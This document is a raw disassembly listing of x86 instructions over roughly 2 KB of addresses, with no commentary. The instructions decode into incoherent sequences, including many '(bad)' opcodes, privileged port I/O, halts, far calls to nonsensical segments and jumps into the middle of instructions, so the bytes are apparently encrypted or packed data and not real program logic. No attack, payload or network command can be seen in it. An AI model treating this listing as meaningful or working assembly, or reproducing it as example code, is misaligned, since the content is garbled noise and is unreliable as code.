  410273:	test   BYTE PTR [edi-0x4b],dh
  410276:	inc    esp
  410277:	sub    al,0xe6
  410279:	add    DWORD PTR [ecx+ebx*1-0x80],esp
  41027d:	mov    edx,ebp
  41027f:	cmp    bh,0x59
  410282:	push   0x705e9403
  410287:	nop
  410288:	inc    esp
  410289:	xor    edi,edx
  41028b:	cmp    al,0xf
  41028d:	pushf  
  41028e:	clc    
  41028f:	jnp    0x4102c9
  410291:	out    dx,al
  410292:	(bad)  
  410293:	mov    eax,0x531d46c8
  410298:	jns    0x41030c
  41029a:	push   ss
  41029b:	add    esi,DWORD PTR [ebp-0x6b374ecd]
  4102a1:	mov    ebp,0x43c8e36a
  4102a6:	out    dx,eax
  4102a7:	pop    edx
  4102a8:	jae    0x4102dc
  4102aa:	fbstp  TBYTE PTR [eax+0x275dc1aa]
  4102b0:	add    eax,DWORD PTR [eax+0x21b3d44a]
  4102b6:	jmp    0x41029a
  4102b8:	sub    BYTE PTR [ebx],ah
  4102ba:	aam    0x34
  4102bc:	push   esi
  4102bd:	mov    ss,WORD PTR [ebp-0x1e]
  4102c0:	jp     0x4102a0
  4102c2:	pop    ds
  4102c3:	mov    ebp,0xbe33adec
  4102c8:	(bad)  
  4102c9:	jmp    0x41029e
  4102cb:	aad    0xcb
  4102cd:	add    ch,cl
  4102cf:	mov    al,0x26
  4102d1:	inc    edi
  4102d2:	mov    cl,0x3c
  4102d4:	adc    al,0x9d
  4102d6:	jecxz  0x4102cc
  4102d8:	ja     0x4102a4
  4102da:	imul   ebp,edi,0x1df9e9a4
  4102e0:	psubb  mm3,QWORD PTR [ebx]
  4102e3:	xchg   ebx,eax
  4102e4:	scas   eax,DWORD PTR es:[edi]
  4102e5:	out    0xb3,eax
  4102e7:	aaa    
  4102e8:	ins    DWORD PTR es:[edi],dx
  4102e9:	cmp    BYTE PTR [edi+eiz*1-0x2c8ed1a3],cl
  4102f0:	xchg   DWORD PTR [ebx-0x3],edx
  4102f3:	push   esp
  4102f4:	add    DWORD PTR [edi-0x78822b5c],esp
  4102fa:	pop    ebp
  4102fb:	fbld   TBYTE PTR [esi-0x5378ad81]
  410301:	gs aaa 
  410303:	or     DWORD PTR [edx+0xc],ebp
  410306:	test   eax,0x2fe7b5b
  41030b:	inc    ebp
  41030c:	(bad)  
  41030d:	lahf   
  41030e:	in     eax,0x18
  410310:	je     0x4102b5
  410312:	les    ecx,FWORD PTR [ebx-0xe]
  410315:	jle    0x4102dc
  410317:	jge    0x4102fb
  410319:	dec    ebx
  41031a:	fwait
  41031b:	mov    WORD PTR [edx],fs
  41031d:	jecxz  0x4102e9
  41031f:	cwde   
  410320:	cmp    BYTE PTR [edx],al
  410322:	hlt    
  410323:	xchg   esi,eax
  410324:	das    
  410325:	adc    dl,ch
  410327:	adc    al,dl
  410329:	cmp    ebp,DWORD PTR [ecx+0xb]
  41032c:	aaa    
  41032d:	xchg   esi,eax
  41032e:	mov    al,0xe6
  410330:	and    DWORD PTR [ecx-0x1033f41e],edx
  410336:	pop    es
  410337:	mov    edi,fs
  410339:	push   edi
  41033a:	jns    0x410390
  41033c:	call   0xe843:0xc8853dd3
  410343:	xchg   ebx,eax
  410344:	icebp  
  410345:	ss dec esi
  410347:	test   al,0xe2
  410349:	shl    edi,cl
  41034b:	outs   dx,DWORD PTR ds:[esi]
  41034c:	(bad)  
  41034d:	mov    ebp,0x3c901e81
  410352:	hlt    
  410353:	addr16 jbe 0x41037a
  410356:	cmc    
  410357:	add    eax,0x167d181
  41035c:	mov    al,ds:0xf7ad02b3
  410361:	adc    DWORD PTR [edi-0x29be5d],esp
  410367:	adc    esp,ebp
  410369:	inc    ecx
  41036a:	mov    WORD PTR [ecx],fs
  41036c:	jnp    0x410302
  41036e:	sbb    eax,0xbb149159
  410373:	sti    
  410374:	or     BYTE PTR [ebp-0x76987aed],dl
  41037a:	xchg   esi,eax
  41037b:	pushf  
  41037c:	pop    ds
  41037d:	ja     0x4103a2
  41037f:	loop   0x41035d
  410381:	iret   
  410382:	stos   DWORD PTR es:[edi],eax
  410383:	es icebp 
  410385:	outs   dx,DWORD PTR ds:[esi]
  410386:	push   ebx
  410387:	dec    eax
  410388:	aas    
  410389:	lods   al,BYTE PTR ds:[esi]
  41038a:	xor    eax,0x5d29d601
  41038f:	repz ret 
  410391:	addr16 xchg ebp,eax
  410393:	popa   
  410394:	dec    edi
  410395:	div    BYTE PTR [edi+0x7486d0f0]
  41039b:	ins    BYTE PTR es:[edi],dx
  41039c:	mov    bh,0xd5
  41039e:	sti    
  41039f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103a0:	aad    0x17
  4103a2:	xchg   ebp,eax
  4103a3:	outs   dx,BYTE PTR ds:[esi]
  4103a4:	xchg   edx,eax
  4103a5:	leave  
  4103a6:	jns    0x4103cf
  4103a8:	test   DWORD PTR [ebx],ebp
  4103aa:	inc    eax
  4103ab:	add    cl,BYTE PTR [ebx+0x1f]
  4103ae:	cli    
  4103af:	inc    edx
  4103b0:	xchg   esp,eax
  4103b1:	test   BYTE PTR [ebx-0x12],0x9
  4103b5:	mov    al,0xf1
  4103b7:	nop
  4103b8:	cmp    BYTE PTR [edi+0x70],bh
  4103bb:	ret    
  4103bc:	inc    esp
  4103bd:	mov    dl,dh
  4103bf:	gs test ebx,0xc002f43f
  4103c6:	sbb    BYTE PTR [edi+0x5d],ch
  4103c9:	lods   al,BYTE PTR ds:[esi]
  4103ca:	and    DWORD PTR [ebx],esi
  4103cc:	push   es
  4103cd:	dec    ebx
  4103ce:	and    edx,DWORD PTR [ebx]
  4103d0:	retf   0xf65d
  4103d3:	xor    bh,ah
  4103d5:	mov    ebx,0xe8ce150e
  4103da:	fabs   
  4103dc:	push   ebp
  4103dd:	mov    bh,0xb5
  4103df:	mov    edx,0xf7116088
  4103e4:	test   BYTE PTR [ebx+0x40bda4d2],dh
  4103ea:	xchg   esp,eax
  4103eb:	adc    al,0x88
  4103ed:	sub    al,0x9e
  4103ef:	sub    eax,0x1e2c4944
  4103f4:	jne    0x410382
  4103f6:	inc    ebp
  4103f7:	out    0x3b,eax
  4103f9:	push   ss
  4103fa:	dec    eax
  4103fb:	jl     0x410441
  4103fd:	mov    ebx,DWORD PTR [eax-0x4d]
  410400:	aas    
  410401:	(bad)  
  410402:	mov    cs,WORD PTR [edi+0x4a]
  410405:	pop    esp
  410406:	inc    ebx
  410407:	scas   al,BYTE PTR es:[edi]
  410408:	mov    eax,0x18ba2e9a
  41040d:	push   0x2d935366
  410412:	push   ebp
  410413:	xchg   esp,eax
  410414:	ins    BYTE PTR es:[edi],dx
  410415:	mov    eax,ds:0x75cac842
  41041a:	mov    al,BYTE PTR [ecx+esi*4-0x738cd760]
  410421:	pusha  
  410422:	ds arpl di,sp
  410425:	pop    ecx
  410426:	mov    ch,0x50
  410428:	xlat   BYTE PTR ds:[ebx]
  410429:	push   cs
  41042a:	iret   
  41042b:	imul   ebp,edi,0xffffff99
  41042e:	mov    ebx,0x25d17614
  410433:	sub    ebx,DWORD PTR [ebx]
  410435:	and    ah,ah
  410437:	outs   dx,BYTE PTR ds:[esi]
  410438:	xchg   DWORD PTR [edi+eax*2-0x25],eax
  41043c:	push   ds
  41043d:	jae    0x41048a
  41043f:	mov    dh,0x2d
  410441:	and    eax,0x8fca6bc0
  410446:	aam    0xa
  410448:	and    ch,BYTE PTR [ebx+ecx*8]
  41044b:	test   dh,bl
  41044d:	(bad)  
  41044e:	jne    0x41040d
  410450:	mov    ch,BYTE PTR [esp+ecx*1-0x76]
  410454:	mov    cs,ebp
  410456:	jp     0x4103f5
  410458:	sbb    bh,al
  41045a:	jo     0x4103e2
  41045c:	int3   
  41045d:	ret    0xa648
  410460:	icebp  
  410461:	xchg   edx,eax
  410462:	mov    WORD PTR [ebx-0x11],?
  410465:	(bad)  
  410466:	call   0x2831:0x8aa36932
  41046d:	mov    edx,0xddda32d
  410472:	daa    
  410473:	dec    eax
  410474:	jp     0x4104b6
  410476:	pop    edx
  410477:	in     eax,dx
  410478:	push   esp
  410479:	syscall 
  41047b:	aaa    
  41047c:	sub    BYTE PTR [ebx],dh
  41047e:	push   edx
  41047f:	mov    cl,BYTE PTR [edi-0x193aba39]
  410485:	pop    ds
  410486:	jae    0x4319fd7
  41048c:	(bad)  
  41048d:	lods   eax,DWORD PTR ds:[esi]
  41048e:	lahf   
  41048f:	mov    bl,0x1d
  410491:	dec    eax
  410492:	cmp    ah,bl
  410494:	retf   
  410495:	popf   
  410496:	outs   dx,BYTE PTR ds:[esi]
  410497:	scas   al,BYTE PTR es:[edi]
  410498:	sar    DWORD PTR [di],cl
  41049b:	test   al,0x29
  41049d:	rcl    ebx,1
  41049f:	push   ebx
  4104a0:	scas   eax,DWORD PTR es:[edi]
  4104a1:	rcr    DWORD PTR ds:0x4c14712d,cl
  4104a7:	inc    esp
  4104a8:	add    DWORD PTR [ebx+0x71],0x9438349f
  4104af:	mov    dh,BYTE PTR [ebx]
  4104b1:	lahf   
  4104b2:	mov    eax,0xd6511413
  4104b7:	add    BYTE PTR [edi-0x7c],0x83
  4104bb:	loopne 0x41043e
  4104bd:	mov    esp,0xef2069ae
  4104c2:	xchg   DWORD PTR [eax-0x7b],edx
  4104c5:	daa    
  4104c6:	shl    BYTE PTR [ebp-0x59d7b7d0],cl
  4104cc:	das    
  4104cd:	dec    edx
  4104ce:	pop    eax
  4104cf:	dec    ebp
  4104d0:	adc    esp,esp
  4104d2:	mov    bh,0x22
  4104d4:	hlt    
  4104d5:	(bad)  
  4104d6:	inc    edx
  4104d7:	xchg   edi,eax
  4104d8:	fidivr DWORD PTR [esp+edi*1]
  4104db:	and    DWORD PTR [eax+esi*4],ecx
  4104de:	stos   DWORD PTR es:[edi],eax
  4104df:	lods   al,BYTE PTR ds:[esi]
  4104e0:	outs   dx,BYTE PTR ds:[esi]
  4104e1:	sbb    bh,BYTE PTR [edi]
  4104e3:	jge    0x410491
  4104e5:	xchg   BYTE PTR ds:0x8f462f16,ch
  4104eb:	ficomp DWORD PTR [ebx-0x7e]
  4104ee:	sahf   
  4104ef:	jno    0x41055c
  4104f1:	xchg   esi,eax
  4104f2:	mov    ds:0x5940b7eb,eax
  4104f7:	sbb    ecx,esp
  4104f9:	in     al,0xd0
  4104fb:	lea    esp,[ebx+0x4d297fb5]
  410501:	jnp    0x4104b5
  410503:	pop    ebp
  410504:	cmc    
  410505:	xchg   ecx,ecx
  410507:	repnz cs dec edx
  41050a:	cmp    BYTE PTR [ebx+edx*1],dl
  41050d:	mov    esi,ebp
  41050f:	dec    eax
  410510:	and    BYTE PTR [edx+0x677750d],0xe7
  410517:	std    
  410518:	pop    ebp
  410519:	int    0xad
  41051b:	and    al,0xc3
  41051d:	or     ah,BYTE PTR [ebx]
  41051f:	xor    bl,BYTE PTR [esi+0x3]
  410522:	(bad)  
  410523:	jle    0x41050c
  410525:	lods   eax,DWORD PTR ds:[esi]
  410526:	jns    0x4104e8
  410528:	fs jp  0x41057a
  41052b:	fcos   
  41052d:	adc    eax,DWORD PTR [eax-0x4cca676b]
  410533:	and    DWORD PTR [ebp-0x13],eax
  410536:	sti    
  410537:	test   al,0xd6
  410539:	mov    edi,edi
  41053b:	pop    ds
  41053c:	xchg   BYTE PTR [edi+ebx*4+0x7ffee62],dh
  410543:	imul   esi
  410545:	pop    ebp
  410546:	and    eax,0xd466c3e0
  41054b:	and    BYTE PTR [ecx-0x21],bh
  41054e:	pop    ss
  41054f:	cmp    DWORD PTR [edx-0x67c3db81],ecx
  410555:	adc    eax,0xbd984815
  41055a:	push   cs
  41055b:	or     al,0x4c
  41055d:	(bad)  
  41055e:	jno    0x4105cc
  410560:	sub    edi,edi
  410562:	xor    BYTE PTR [esi+ebp*4],ch
  410565:	mov    bl,0x47
  410567:	or     ch,BYTE PTR [ebx+0x61]
  41056a:	arpl   WORD PTR [ebx-0x42bbee51],bx
  410570:	sar    BYTE PTR [esi],0xb0
  410573:	(bad)  [ebp-0x7c]
  410576:	cmc    
  410577:	and    edx,eax
  410579:	mov    esi,DWORD PTR [ecx]
  41057b:	popf   
  41057c:	adc    al,0xc1
  41057e:	enter  0xd924,0x78
  410582:	(bad)  
  410583:	lahf   
  410584:	or     BYTE PTR [ebx+0x5f],0xe8
  410588:	mov    bh,BYTE PTR [eax+0x415d7e37]
  41058e:	in     eax,0xe6
  410590:	ret    
  410591:	xor    esi,DWORD PTR [ecx]
  410593:	in     eax,0x28
  410595:	or     esi,DWORD PTR [edx-0x2b]
  410598:	push   ecx
  410599:	lods   eax,DWORD PTR ds:[esi]
  41059a:	js     0x41056f
  41059c:	sar    DWORD PTR [eax],0x4
  41059f:	push   es
  4105a0:	sub    DWORD PTR [ebx+0x5646619a],ebp
  4105a6:	xor    ebx,edi
  4105a8:	scas   eax,DWORD PTR es:[edi]
  4105a9:	mov    DWORD PTR [ecx+eiz*1+0x37],ebx
  4105ad:	mov    bh,0x87
  4105af:	loop   0x41058f
  4105b1:	ror    edx,0x4
  4105b4:	sar    BYTE PTR [esi+0x16704425],cl
  4105ba:	retf   0xfb4c
  4105bd:	std    
  4105be:	aas    
  4105bf:	push   es
  4105c0:	sti    
  4105c1:	iret   
  4105c2:	pop    ebx
  4105c3:	pop    eax
  4105c4:	int3   
  4105c5:	add    ecx,0xb6b80593
  4105cb:	jp     0x4105c4
  4105cd:	retf   0x6c4c
  4105d0:	pop    edx
  4105d1:	shl    BYTE PTR [ecx-0x4e],0xbf
  4105d5:	dec    ebx
  4105d6:	push   es
  4105d7:	fsubr  QWORD PTR [eax+0x55]
  4105da:	loop   0x410659
  4105dc:	stc    
  4105dd:	inc    ecx
  4105de:	mov    ds:0xdfcee2a3,eax
  4105e3:	pop    esp
  4105e4:	mov    ebp,0xd0c010c8
  4105e9:	adc    DWORD PTR [eax],0xffffffec
  4105ec:	adc    DWORD PTR [ebx-0x29],ebp
  4105ef:	pop    edi
  4105f0:	xor    BYTE PTR [edi+0xae8fc5e],0x8f
  4105f7:	pop    ss
  4105f8:	push   es
  4105f9:	add    cl,BYTE PTR [eax+0x38]
  4105fc:	stos   DWORD PTR es:[edi],eax
  4105fd:	xor    dl,ah
  4105ff:	xchg   esi,eax
  410600:	jecxz  0x4105a7
  410602:	cwde   
  410603:	sbb    esp,ecx
  410605:	std    
  410606:	imul   eax,DWORD PTR [edi+edi*1-0x32874b03],0x16548bc2
  410611:	add    ebp,esp
  410613:	cmp    BYTE PTR [esi],bl
  410615:	xor    ah,BYTE PTR [ecx+ecx*4+0x6a9b8c8c]
  41061c:	lods   eax,DWORD PTR ds:[esi]
  41061d:	push   ecx
  41061e:	dec    edi
  41061f:	call   0x2d64:0x8efa8b94
  410626:	test   DWORD PTR [edx],esp
  410628:	xchg   edx,eax
  410629:	jns    0x4105bf
  41062b:	not    DWORD PTR [edx-0x23121d24]
  410631:	xor    eax,0xc5073849
  410636:	mov    ch,0x18
  410638:	adc    DWORD PTR [ecx+eiz*8-0x52],0xffffffb1
  41063d:	xor    BYTE PTR [edi+0x5f],0x9e
  410641:	sub    BYTE PTR [ebx-0x51c73af9],dh
  410647:	rcr    DWORD PTR ds:0x47202f2b,cl
  41064d:	mov    esi,DWORD PTR [ebp+0x47]
  410650:	mov    ebx,0xaab4bdfe
  410655:	test   eax,0x3c02f965
  41065a:	jbe    0x4105f0
  41065c:	js     0x410608
  41065e:	pop    eax
  41065f:	cdq    
  410660:	jno    0x4105f2
  410662:	add    al,0x13
  410664:	fcom   QWORD PTR [edi+0x30bdf5b2]
  41066a:	inc    eax
  41066b:	ja     0x4106b2
  41066d:	in     al,0x57
  41066f:	jecxz  0x4106db
  410671:	push   esi
  410672:	imul   esi,DWORD PTR [ebx+0x5649c3d6],0x67106915
  41067c:	rol    ecx,0x7b
  41067f:	popf   
  410680:	push   edi
  410681:	sahf   
  410682:	xchg   esp,eax
  410683:	outs   dx,BYTE PTR ds:[esi]
  410684:	pushf  
  410685:	xor    DWORD PTR [esi-0x1c],0xffffffe5
  410689:	js     0x4106c5
  41068b:	pop    eax
  41068c:	(bad)  
  41068d:	fldenv [eax]
  41068f:	fndisi(8087 only) 
  410691:	cmp    esi,ecx
  410693:	sbb    BYTE PTR ds:0x71651543,dl
  410699:	or     edi,DWORD PTR [esi+0x7f]
  41069c:	push   edx
  41069d:	and    DWORD PTR [edi+0x47a5d46c],ebp
  4106a3:	mov    al,ds:0x650c02c3
  4106a8:	push   esp
  4106a9:	or     al,0x8e
  4106ab:	mov    al,0x23
  4106ad:	add    BYTE PTR [ecx+0x4b8f04f6],dh
  4106b3:	jb     0x4106e7
  4106b5:	pop    ds
  4106b6:	xchg   ecx,eax
  4106b7:	jl     0x410690
  4106b9:	sbb    al,0x43
  4106bb:	push   cs
  4106bc:	loopne 0x4106da
  4106be:	mov    cl,bh
  4106c0:	retf   
  4106c1:	sub    BYTE PTR [esi+ebp*8],dh
  4106c4:	push   eax
  4106c5:	lds    edi,FWORD PTR [edx-0x71]
  4106c8:	inc    esi
  4106c9:	test   al,0xeb
  4106cc:	add    al,0x8e
  4106ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106cf:	in     al,0x2
  4106d1:	inc    edi
  4106d2:	pop    ebx
  4106d3:	sbb    eax,0x7de2b0ee
  4106d8:	std    
  4106d9:	dec    ecx
  4106da:	fmul   QWORD PTR [esi+ebp*4-0x3401b23]
  4106e1:	xchg   edx,eax
  4106e2:	call   0x7870e1ad
  4106e7:	and    BYTE PTR [edx-0x29],al
  4106ea:	push   0xb379ea4a
  4106ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106f0:	stos   DWORD PTR es:[edi],eax
  4106f1:	add    al,BYTE PTR [edx-0x4bc52ca6]
  4106f7:	retf   0x30a3
  4106fa:	sahf   
  4106fb:	shr    esi,1
  4106fd:	jns    0x4106ea
  4106ff:	dec    ebp
  410700:	adc    BYTE PTR [ecx],bh
  410702:	rcr    BYTE PTR [ebx-0x23],1
  410705:	push   0x78
  410707:	(bad)  
  410708:	mov    ds:0x716cfdc7,eax
  41070d:	ins    DWORD PTR es:[edi],dx
  41070e:	mov    ebp,0x825cddc
  410713:	outs   dx,DWORD PTR ds:[esi]
  410714:	pop    ds
  410715:	test   BYTE PTR [eax-0x79],bh
  410718:	cdq    
  410719:	aad    0x2d
  41071b:	cld    
  41071c:	ja     0x4106d7
  41071e:	popf   
  41071f:	stc    
  410720:	push   ss
  410721:	xor    BYTE PTR [edi-0x26],dh
  410724:	nop
  410725:	enter  0x1ab,0xe2
  410729:	xchg   edx,eax
  41072a:	mov    ds:0xefca7687,eax
  41072f:	mov    esi,0xcd0de8bf
  410734:	call   0xb681:0xe19e60fc
  41073b:	add    esp,DWORD PTR [ebp-0x7]
  41073e:	jo     0x41076e
  410740:	dec    edi
  410741:	mov    al,ds:0xc8a1154
  410746:	stos   DWORD PTR es:[edi],eax
  410747:	icebp  
  410748:	mov    edi,0x11ed9942
  41074d:	outs   dx,DWORD PTR ds:[esi]
  41074e:	add    esi,DWORD PTR [edx-0xc]
  410751:	jmp    0x41078a
  410753:	pop    ds
  410754:	imul   edx,DWORD PTR [esi-0x61],0xc60b77ac
  41075b:	cdq    
  41075c:	dec    edx
  41075d:	hlt    
  41075e:	fcmovnbe st,st(3)
  410760:	mov    eax,ds:0xe96c5606
  410765:	test   cl,cl
  410767:	xchg   DWORD PTR [eax-0x13b6502a],edx
  41076d:	retf   0x5bce
  410770:	lock pop esp
  410772:	mov    edi,0xe775a28a
  410777:	jae    0x410721
  410779:	push   eax
  41077a:	pop    edx
  41077b:	mov    bh,0xc0
  41077d:	or     eax,0xb8a6fe31
  410782:	dec    esi
  410783:	mov    ds:0x8a429ace,al
  410788:	call   DWORD PTR [ebx]
  41078a:	mov    dh,0x49
  41078c:	dec    edi
  41078d:	(bad)  
  41078e:	call   0xa2c5aa2
  410793:	(bad)  
  410794:	std    
  410795:	add    ebp,DWORD PTR [edi+eiz*8-0x34d1c2d8]
  41079c:	sbb    ah,ch
  41079e:	adc    BYTE PTR [edx+0x1e7c2f52],0x18
  4107a5:	pop    ds
  4107a6:	inc    esp
  4107a7:	aaa    
  4107a8:	imul   esp
  4107aa:	rol    BYTE PTR [ecx-0x4b60cb6],0x98
  4107b1:	fild   DWORD PTR [ebp-0x2a]
  4107b4:	sbb    eax,0x26a72f11
  4107b9:	add    DWORD PTR ds:0x15d44102,ebp
  4107bf:	rcl    DWORD PTR [esi],cl
  4107c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c2:	cmc    
  4107c3:	addr16 (bad) 
  4107c5:	pop    esi
  4107c6:	gs stc 
  4107c8:	xor    DWORD PTR [edx+0x47d4a25c],edx
  4107ce:	bound  eax,QWORD PTR [ecx+0x64]
  4107d1:	sar    BYTE PTR [esi+0x47ae15e3],0x83
  4107d8:	mov    ebx,0x34c998e6
  4107dd:	add    al,0x82
  4107df:	push   ss
  4107e0:	clc    
  4107e1:	retf   
  4107e2:	dec    edi
  4107e3:	lahf   
  4107e4:	rol    BYTE PTR [esi-0x45],cl
  4107e7:	sub    eax,0xc50f2c4d
  4107ec:	out    dx,al
  4107ed:	js     0x410859
  4107ef:	and    ah,BYTE PTR [ecx+0x36]
  4107f2:	fisttp QWORD PTR [esi-0x77]
  4107f5:	sub    al,0xc0
  4107f7:	stos   BYTE PTR es:[edi],al
  4107f8:	mov    ebp,0x30bb684d
  4107fd:	enter  0x1ecc,0x8e
  410801:	mov    esi,DWORD PTR [esi-0x67]
  410804:	(bad)  
  410805:	cmp    al,0x0
  410807:	dec    ecx
  410808:	push   eax
  410809:	pop    es
  41080a:	(bad)
  41080d:	aas    
  41080e:	dec    esi
  41080f:	sub    dh,BYTE PTR ds:0xef565471
  410815:	sbb    eax,0x34dffad6
  41081a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41081b:	sub    bl,ah
  41081d:	jmp    0x41080f
  41081f:	push   es
  410820:	pusha  
  410821:	xor    al,BYTE PTR [edi-0x1c]
  410824:	jmp    0x410866
  410826:	fisttp WORD PTR [esi+0x7239253a]
  41082c:	test   eax,0x1051c5ad
  410831:	and    al,0xda
  410833:	mov    ebp,0xd7b1e4e6
  410838:	aam    0xaf
  41083a:	aam    0x6e
  41083c:	pop    ebp
  41083d:	jns    0x4108aa
  41083f:	xchg   ecx,eax
  410840:	xchg   esp,eax
  410841:	inc    edi
  410842:	adc    eax,0x2129dabf
  410847:	clc    
  410848:	cmp    dh,BYTE PTR [edi]
  41084a:	pop    edi
  41084b:	and    BYTE PTR [eax],bl
  41084d:	aas    
  41084e:	or     eax,DWORD PTR [edi-0x1bd7e882]
  410854:	sub    DWORD PTR [edi+0x4f],edi
  410857:	push   ebp
  410858:	mul    dl
  41085a:	adc    al,0x23
  41085c:	push   edx
  41085d:	mov    edi,0x2452bef2
  410862:	fs scas eax,DWORD PTR es:[edi]
  410864:	fist   WORD PTR [ebx+eiz*1+0x51]
  410868:	test   al,0x7c
  41086a:	or     al,BYTE PTR [ebx+eax*1-0x57700e9b]
  410871:	cwde   
  410872:	push   eax
  410873:	loopne 0x4108eb
  410875:	jl     0x4108b8
  410877:	retf   
  410878:	imul   ecx,DWORD PTR [eax],0x7c
  41087b:	jmp    0x4108b1
  41087d:	ret    
  41087e:	into   
  41087f:	ins    BYTE PTR es:[edi],dx
  410880:	jl     0x410895
  410882:	ins    DWORD PTR es:[edi],dx
  410883:	xchg   ebx,eax
  410884:	out    dx,eax
  410885:	dec    eax
  410886:	sbb    eax,0x7f6ec516
  41088b:	js     0x4108aa
  41088d:	add    al,0xee
  41088f:	ret    
  410890:	lea    eax,[edi-0x6bc30b7b]
  410896:	inc    ebp
  410897:	sub    dh,ah
  410899:	retf   
  41089a:	enter  0x1503,0x66
  41089e:	daa    
  41089f:	push   ss
  4108a0:	mov    ebp,0x3e188c0c
  4108a5:	loope  0x41088c
  4108a7:	ret    0x5089
  4108aa:	inc    ecx
  4108ab:	in     eax,0x77
  4108ad:	lock pop edi
  4108af:	es sahf 
  4108b1:	mov    edi,0xcbb180a2
  4108b6:	cwde   
  4108b7:	jne    0x4108dc
  4108b9:	push   ss
  4108ba:	cmp    DWORD PTR [ebx-0x27],esi
  4108bd:	sub    eax,0x37d029ba
  4108c2:	push   eax
  4108c3:	test   al,0x91
  4108c5:	(bad)  
  4108c6:	and    esp,ebp
  4108c8:	je     0x410874
  4108ca:	and    dh,BYTE PTR [ecx+0x57f70ced]
  4108d0:	psubusw mm3,mm3
  4108d3:	sahf   
  4108d4:	cwde   
  4108d5:	lds    ebx,FWORD PTR [edx-0x1edb40a4]
  4108db:	popf   
  4108dc:	or     al,0xc4
  4108de:	retf   0x6b46
  4108e1:	mov    dh,0x13
  4108e3:	pop    edi
  4108e4:	xchg   ebx,eax
  4108e5:	ja     0x41092d
  4108e7:	fldenv [ebp-0x21b23944]
  4108ed:	rol    DWORD PTR [ecx+0xa57b848],cl
  4108f3:	inc    ecx
  4108f4:	add    BYTE PTR [ebx-0x2cd10abb],dl
  4108fa:	cdq    
  4108fb:	cmp    BYTE PTR [eax],al
  4108fd:	mov    eax,DWORD PTR [edi-0x431091b8]
  410903:	mov    al,0x83
  410905:	shr    dh,0xd5
  410908:	cdq    
  410909:	jae    0x41090d
  41090b:	jge    0x410935
  41090d:	and    esi,DWORD PTR [ecx+0x51]
  410910:	jno    0x410922
  410912:	iret   
  410913:	or     ah,bl
  410915:	mov    bl,0x31
  410917:	(bad)
  41091a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091b:	test   al,0x93
  41091d:	dec    ebp
  41091e:	stc    
  41091f:	dec    DWORD PTR [edi+eax*2]
  410922:	cld    
  410923:	fmul   DWORD PTR [edi+0xa]
  410926:	sub    eax,0x3d205519
  41092b:	aas    
  41092c:	push   edi
  41092d:	xchg   ecx,eax
  41092e:	clc    
  41092f:	jnp    0x41091c
  410931:	jb     0x410938
  410933:	retf   
  410934:	mov    al,ds:0x3135d769
  410939:	dec    edx
  41093a:	and    eax,0xd23ea40
  41093f:	test   DWORD PTR [eax+edi*8+0x5f311316],esp
  410946:	cs pop esi
  410948:	(bad)  
  410949:	fmul   QWORD PTR [ecx-0x4c80256d]
  41094f:	pop    ebx
  410950:	retf   
  410951:	test   DWORD PTR [ecx-0x36],ecx
  410954:	xor    BYTE PTR [esi+eiz*1+0x4f],ch
  410958:	imul   ecx,ebx,0x3
  41095b:	dec    ebp
  41095c:	outs   dx,DWORD PTR ds:[esi]
  41095d:	(bad)  
  41095e:	ds (bad) 
  410960:	dec    ebp
  410961:	jl     0x410951
  410963:	test   al,0x81
  410965:	rol    edx,cl
  410967:	std    
  410968:	adc    BYTE PTR [ecx-0x75],0x60
  41096c:	imul   ebp,DWORD PTR [esi+0x3fa9ba64],0x67
  410973:	xlat   BYTE PTR ds:[ebx]
  410974:	and    esi,esi
  410976:	or     ah,dh
  410978:	rol    ah,1
  41097a:	out    dx,al
  41097b:	scas   al,BYTE PTR es:[edi]
  41097c:	and    eax,0xf47b54b8
  410981:	(bad)  
  410982:	call   0x67882cd
  410987:	dec    ecx
  410988:	sub    al,0x4b
  41098a:	call   0xc245e51d
  41098f:	out    dx,al
  410990:	or     BYTE PTR [esi+0x3043e4d1],dl
  410996:	or     esp,ecx
  410998:	imul   ebx,DWORD PTR [esi+0x52],0xf0a8fb3b
  41099f:	mov    bl,0xb8
  4109a1:	push   ebx
  4109a2:	fmul   st,st(1)
  4109a4:	or     al,0xb2
  4109a6:	dec    edx
  4109a7:	jp     0x41092f
  4109a9:	push   eax
  4109aa:	clc    
  4109ab:	sbb    edi,DWORD PTR [ecx+0x51]
  4109ae:	popa   
  4109af:	xchg   ecx,eax
  4109b0:	test   ebp,esi
  4109b2:	adc    al,0x13
  4109b4:	(bad)  
  4109b5:	adc    al,0x5b
  4109b7:	dec    ecx
  4109b8:	cmp    al,0x64
  4109ba:	inc    ecx
  4109bb:	mov    ebx,0x952ce16f
  4109c0:	repz sub dh,BYTE PTR [ebx]
  4109c3:	push   ss
  4109c4:	hlt    
  4109c5:	xor    dl,ah
  4109c7:	hlt    
  4109c8:	loop   0x410981
  4109ca:	loope  0x4109d4
  4109cc:	shl    DWORD PTR [ebx+0x54],cl
  4109cf:	jb     0x4109c8
  4109d1:	in     eax,dx
  4109d2:	mov    ds:0x6de60245,al
  4109d7:	mov    al,ds:0xf2d70df9
  4109dc:	fstp   DWORD PTR [ecx]
  4109de:	movd   mm2,DWORD PTR [ecx+edx*4+0x120843bf]
  4109e6:	inc    esi
  4109e7:	test   al,0xde
  4109e9:	dec    ebp
  4109ea:	adc    BYTE PTR [eax-0x12],bl
  4109ed:	dec    edx
  4109ee:	adc    ecx,DWORD PTR [eax+0xd]
  4109f1:	mov    ebx,0xa7600d5c
  4109f6:	sahf   
  4109f7:	in     eax,dx
  4109f8:	loopne 0x410a75
  4109fa:	jmp    0xdcb6:0xb5ddcfd6
  410a01:	push   eax
  410a02:	gs jge 0x410a19
  410a05:	pop    edx
  410a06:	sbb    DWORD PTR [eax+0x13ea2ba6],edx
  410a0c:	sbb    al,BYTE PTR [ecx+0x346715bf]
  410a12:	ins    DWORD PTR es:[edi],dx
  410a13:	pop    edx
  410a14:	push   ebp
  410a15:	(bad)  
  410a16:	fmul   QWORD PTR [edx+0x72]
  410a19:	repnz xchg ebp,eax
  410a1b:	push   0xffffff9d
  410a1d:	jg     0x410a2b
  410a1f:	(bad)  
  410a20:	jecxz  0x410a1b
  410a22:	hlt    
  410a23:	gs aad 0x7b
  410a26:	cmc    
  410a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a28:	dec    esi
  410a29:	ret    0x5213
